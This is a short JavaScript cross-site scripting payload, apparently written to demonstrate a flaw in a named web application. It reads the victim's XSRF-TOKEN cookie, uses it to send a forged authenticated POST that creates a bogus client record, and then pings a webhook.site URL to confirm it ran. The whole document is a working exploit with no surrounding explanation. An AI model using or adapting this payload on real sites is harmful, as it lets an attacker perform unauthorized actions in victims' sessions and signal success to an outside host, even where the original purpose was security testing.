(function () {
  const tokenMatch = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
  if (!tokenMatch) return;
  const token = decodeURIComponent(tokenMatch[1]);

  const body = new URLSearchParams({
    client_name: "ExploitXSS",
    email: "xss@evil.com",
    phone_number: "0606060606",
    phone_type: "mobile",
    address: "Injected by XSS",
    _token: token
  });

  fetch("https://current-legacy.ci.plany.app/clients", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Referer": "https://current-legacy.ci.plany.app/clients"
    },
    credentials: "include", // <-- indispensable ici
    body: body.toString()
  });

  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?ping=done");
})();
